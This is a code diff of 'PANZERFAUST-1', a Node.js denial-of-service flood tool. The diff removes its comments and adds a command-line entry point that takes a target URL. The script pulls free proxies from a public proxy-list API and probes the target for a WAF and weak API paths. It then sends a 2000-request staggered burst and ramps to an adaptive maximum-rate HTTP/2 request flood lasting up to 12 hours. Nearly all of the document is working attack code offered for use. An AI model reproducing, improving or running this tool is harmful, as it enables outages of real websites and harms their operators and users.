@@ -8,17 +8,15 @@ class PANZERFAUST_1 {
         this.targetUrl = targetUrl;
         this.hostname = new URL(targetUrl).hostname;
         this.startTime = Date.now();
-        this.maxRuntime = 12 * 60 * 60 * 1000; // 12 hours
+        this.maxRuntime = 12 * 60 * 60 * 1000;
         this.status = "RECON";
         
-        // PROXY SYSTEMS
         this.http1Proxies = [];
         this.http2Proxies = [];
         this.activeProxies = [];
         this.currentProxyIndex = 0;
         this.proxyFallbackUrl = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000';
         
-        // ATTACK SYSTEMS
         this.totalRequests = 0;
         this.currentRPS = 0;
         this.requestsSinceLastCalc = 0;
@@ -27,19 +25,16 @@ class PANZERFAUST_1 {
         this.attackIntensity = 0;
         this.maxIntensity = 100;
         
-        // TARGET ANALYSIS
         this.wafDetected = false;
         this.wafType = "UNKNOWN";
         this.weakPoints = [];
         this.baseResponseTime = 0;
         this.rateLimitThreshold = 5;
         
-        // MEMORY MANAGEMENT
         this.activeConnections = new Map();
         this.lastCleanup = Date.now();
         this.connectionCounter = 0;
         
-        // TIMERS
         this.proxyScanTimeout = null;
         this.targetScanTimeout = null;
         this.attackInterval = null;
@@ -47,7 +42,6 @@ class PANZERFAUST_1 {
         this.runtimeChecker = null;
     }
 
-    // === INITIAL SETUP ===
     initialize() {
         console.log('PANZERFAUST-1 | TØR — (00:00:00)');
         console.log('='.repeat(50));
@@ -57,17 +51,11 @@ class PANZERFAUST_1 {
         this.startReconPhase();
     }
 
-    // === PHASE 1: PROXY DISCOVERY (30s) ===
     startReconPhase() {
         console.log('[+] PHASE 1: Loading proxies (30s)...');
-        
-        // LOAD LOCAL PROXIES
         this.loadLocalProxies();
-        
-        // START PROXY TESTING
         this.testLocalProxies();
         
-        // SET TIMEOUT FOR NEXT PHASE
         this.proxyScanTimeout = setTimeout(() => {
             this.startTargetAnalysis();
         }, 30000);
@@ -100,8 +88,7 @@ class PANZERFAUST_1 {
     }
 
     async testLocalProxies() {
-        // TEST H1 PROXIES (Simple TCP connect test)
-        for (const proxy of this.http1Proxies.slice(0, 50)) { // Test first 50
+        for (const proxy of this.http1Proxies.slice(0, 50)) {
             try {
                 const [host, port] = proxy.split(':');
                 await this.testTcpConnection(host, parseInt(port));
@@ -112,15 +99,11 @@ class PANZERFAUST_1 {
                     working: true,
                     lastUsed: 0
                 });
-            } catch (err) {
-                // Proxy failed
-            }
+            } catch (err) {}
         }
         
-        // TEST H2 PROXIES (HTTP/2 connect)
-        for (const proxy of this.http2Proxies.slice(0, 20)) { // Test first 20
+        for (const proxy of this.http2Proxies.slice(0, 20)) {
             try {
-                // Simple test - try to create connection
                 const testUrl = `https://${proxy}`;
                 await new Promise((resolve, reject) => {
                     const client = http2.connect(this.targetUrl);
@@ -139,9 +122,7 @@ class PANZERFAUST_1 {
                     working: true,
                     lastUsed: 0
                 });
-            } catch (err) {
-                // Proxy failed
-            }
+            } catch (err) {}
         }
         
         console.log(`[+] ${this.activeProxies.length} working proxies found`);
@@ -171,31 +152,21 @@ class PANZERFAUST_1 {
         });
     }
 
-    // === PHASE 2: TARGET ANALYSIS (12s) ===
     startTargetAnalysis() {
         clearTimeout(this.proxyScanTimeout);
         this.status = "ANALYSIS";
-        
         console.log('\n[+] PHASE 2: Target analysis (12s)...');
-        
-        // BASIC WAF DETECTION
         this.detectWAF();
-        
-        // FIND WEAK POINTS
         this.findWeakPoints();
         
-        // SET TIMEOUT FOR NEXT PHASE
         this.targetScanTimeout = setTimeout(() => {
             this.startAttackPhase();
         }, 12000);
     }
 
     async detectWAF() {
-        // SIMPLE WAF DETECTION BY HEADERS
         try {
             const response = await this.makeProbeRequest();
-            
-            // CHECK FOR WAF HEADERS
             const headers = response.headers;
             const server = headers['server'] || '';
             const via = headers['via'] || '';
@@ -214,7 +185,6 @@ class PANZERFAUST_1 {
             }
             
             this.baseResponseTime = Date.now() - response.startTime;
-            
         } catch (err) {
             console.log('[-] WAF detection failed');
         }
@@ -250,7 +220,6 @@ class PANZERFAUST_1 {
     }
 
     findWeakPoints() {
-        // COMMON WEAK POINTS TO TEST
         const testPaths = [
             '/api/v1',
             '/api/v2',
@@ -266,7 +235,6 @@ class PANZERFAUST_1 {
         
         console.log('[+] Scanning for weak points...');
         
-        // TEST EACH PATH (LIMITED TO 3 FOR SPEED)
         testPaths.slice(0, 3).forEach(path => {
             const testUrl = `https://${this.hostname}${path}`;
             
@@ -288,20 +256,16 @@ class PANZERFAUST_1 {
         }, 5000);
     }
 
-    // === PHASE 3: ATTACK PREPARATION (5s wait) ===
     startAttackPhase() {
         clearTimeout(this.targetScanTimeout);
         this.status = "PREPARING";
-        
         console.log('\n[+] PHASE 3: Attack preparation (5s)...');
         
-        // ENSURE WE HAVE PROXIES
         if (this.activeProxies.length === 0) {
             console.log('[!] No local proxies, fetching from API...');
             this.fetchFallbackProxies();
         }
         
-        // WAIT 5 SECONDS
         setTimeout(() => {
             this.launchAttack();
         }, 5000);
@@ -319,7 +283,6 @@ class PANZERFAUST_1 {
             
             const proxies = data.split('\n').filter(p => p.trim());
             
-            // TAKE FIRST 10 PROXIES AND TEST THEM
             for (const proxy of proxies.slice(0, 10)) {
                 try {
                     const [host, port] = proxy.split(':');
@@ -339,43 +302,34 @@ class PANZERFAUST_1 {
             }
             
             console.log(`[+] Added ${this.activeProxies.length} fallback proxies`);
-            
         } catch (err) {
             console.log('[-] Failed to fetch fallback proxies');
         }
     }
 
-    // === PHASE 4: INTELLIGENT ATTACK ===
     launchAttack() {
         this.status = "ATTACKING";
         this.attackPhase = "STAGGERED";
-        
         console.log('\n[+] PHASE 4: LAUNCHING INTELLIGENT ATTACK');
         console.log('[!] Starting staggered approach...');
         
-        // START STAGGERED ATTACK (2000 reqs, then wait 5s)
         this.sendStaggeredBatch();
         
-        // START MAIN ATTACK LOOP AFTER STAGGER
         setTimeout(() => {
             console.log('[!] Switching to MAX RPS mode');
             this.attackPhase = "MAX";
             this.startMaxAttack();
-        }, 5000); // Wait 5s after initial 2000
+        }, 5000);
         
-        // START RUNTIME CHECKER
         this.startRuntimeMonitor();
-        
-        // START MEMORY CLEANUP
         this.startCleanupLoop();
     }
 
     sendStaggeredBatch() {
         console.log('[+] Sending 2000 request batch...');
-        
         let sent = 0;
         const batchSize = 100;
-        const totalBatches = 20; // 20 × 100 = 2000
+        const totalBatches = 20;
         
         const sendBatch = () => {
             if (sent >= totalBatches) return;
@@ -387,7 +341,7 @@ class PANZERFAUST_1 {
             sent++;
             
             if (sent < totalBatches) {
-                setTimeout(sendBatch, 100); // Small delay between batches
+                setTimeout(sendBatch, 100);
             }
         };
         
@@ -395,7 +349,6 @@ class PANZERFAUST_1 {
     }
 
     sendRequest() {
-        // CHOOSE PROXY OR DIRECT
         let useProxy = this.activeProxies.length > 0;
         
         if (useProxy) {
@@ -411,15 +364,9 @@ class PANZERFAUST_1 {
             return;
         }
         
-        // ROUND-ROBIN PROXY SELECTION
         const proxy = this.activeProxies[this.currentProxyIndex];
         this.currentProxyIndex = (this.currentProxyIndex + 1) % this.activeProxies.length;
-        
-        // UPDATE PROXY USAGE TIME
         proxy.lastUsed = Date.now();
-        
-        // SEND REQUEST (SIMPLIFIED - ACTUAL PROXY IMPLEMENTATION WOULD BE MORE COMPLEX)
-        // For now, fallback to direct if proxy logic fails
         this.sendDirect();
     }
 
@@ -462,7 +409,6 @@ class PANZERFAUST_1 {
             req.once('close', cleanup);
             
             req.end();
-            
         } catch (err) {
             this.totalRequests++;
             this.requestsSinceLastCalc++;
@@ -470,29 +416,21 @@ class PANZERFAUST_1 {
     }
 
     startMaxAttack() {
-        // MAIN ATTACK LOOP
         this.attackInterval = setInterval(() => {
             if (this.status === "ATTACKING") {
-                // ADAPTIVE INTENSITY BASED ON CONDITIONS
                 const intensity = this.calculateIntensity();
-                
-                // SEND REQUESTS BASED ON INTENSITY
-                const batchSize = Math.floor(intensity * 10); // 0-1000 requests per tick
+                const batchSize = Math.floor(intensity * 10);
                 
                 for (let i = 0; i < batchSize; i++) {
                     this.sendRequest();
                 }
                 
-                // UPDATE DISPLAY
                 this.updateDisplay();
             }
-        }, 100); // 10 ticks per second
+        }, 100);
     }
 
     calculateIntensity() {
-        // SIMPLE INTENSITY CALCULATION
-        // Start at 30%, increase gradually if no errors
-        
         if (this.attackIntensity < 30) {
             this.attackIntensity += 1;
         } else if (this.attackIntensity < 70) {
@@ -500,11 +438,9 @@ class PANZERFAUST_1 {
         } else if (this.attackIntensity < 90) {
             this.attackIntensity += 0.2;
         }
-        
         return this.attackIntensity;
     }
 
-    // === MEMORY MANAGEMENT ===
     startCleanupLoop() {
         this.mainLoop = setInterval(() => {
             this.cleanupStaleConnections();
@@ -517,7 +453,7 @@ class PANZERFAUST_1 {
         const now = Date.now();
         
         for (const [connId, data] of this.activeConnections.entries()) {
-            if (now - data.startTime > 30000) { // 30 seconds old
+            if (now - data.startTime > 30000) {
                 try {
                     data.client.destroy();
                 } catch (err) {}
@@ -525,7 +461,6 @@ class PANZERFAUST_1 {
             }
         }
         
-        // FORCE GC IF AVAILABLE
         if (now - this.lastCleanup > 30000 && global.gc) {
             global.gc();
             this.lastCleanup = now;
@@ -533,10 +468,8 @@ class PANZERFAUST_1 {
     }
 
     checkProxyHealth() {
-        // SIMPLE PROXY HEALTH CHECK - REMOVE DEAD PROXIES
         const now = Date.now();
         this.activeProxies = this.activeProxies.filter(proxy => {
-            // KEEP PROXIES USED IN LAST 5 MINUTES
             if (now - proxy.lastUsed < 300000) {
                 return true;
             }
@@ -544,24 +477,20 @@ class PANZERFAUST_1 {
         });
     }
 
-    // === RUNTIME MONITOR ===
     startRuntimeMonitor() {
         this.runtimeChecker = setInterval(() => {
             const elapsed = Date.now() - this.startTime;
-            
             if (elapsed >= this.maxRuntime) {
                 console.log('\n[!] 12-HOUR RUNTIME LIMIT REACHED');
                 console.log('[!] INITIATING GRACEFUL SHUTDOWN');
                 this.shutdown();
             }
-        }, 60000); // Check every minute
+        }, 60000);
     }
 
-    // === DISPLAY ===
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
-        
         if (timeDiff >= 0.9) {
             this.currentRPS = this.requestsSinceLastCalc / timeDiff;
             this.requestsSinceLastCalc = 0;
@@ -579,7 +508,6 @@ class PANZERFAUST_1 {
 
     updateDisplay() {
         const runtimeStr = this.formatRuntime();
-        
         process.stdout.write(`\rPANZERFAUST-1 | TØR — (${runtimeStr}) | `);
         process.stdout.write(`PROXIES: ${this.activeProxies.length} | `);
         process.stdout.write(`RPS: ${this.currentRPS.toFixed(1)} | `);
@@ -587,7 +515,6 @@ class PANZERFAUST_1 {
         process.stdout.write(`STATUS: ${this.status}`);
     }
 
-    // === SHUTDOWN ===
     shutdown() {
         console.log('\n\n' + '='.repeat(50));
         console.log('PANZERFAUST-1 FINAL REPORT');
@@ -600,12 +527,10 @@ class PANZERFAUST_1 {
         console.log('='.repeat(50));
         
         this.status = "SHUTDOWN";
-        
         clearInterval(this.attackInterval);
         clearInterval(this.mainLoop);
         clearInterval(this.runtimeChecker);
         
-        // DESTROY ALL CONNECTIONS
         for (const [connId, data] of this.activeConnections.entries()) {
             try {
                 data.client.destroy();
@@ -618,6 +543,20 @@ class PANZERFAUST_1 {
         }, 1000);
     }
 
-    // === START ===
     start() {
-       
+        this.initialize();
+        process.on('SIGINT', () => {
+            console.log('\n\n[!] MANUAL SHUTDOWN INITIATED');
+            this.shutdown();
+        });
+    }
+}
+
+const target = process.argv[2];
+if (!target || !target.startsWith('https://')) {
+    console.log('Usage: node panzerfaust-1.js https://target.com');
+    process.exit(1);
+}
+
+const panzer = new PANZERFAUST_1(target);
+panzer.start();
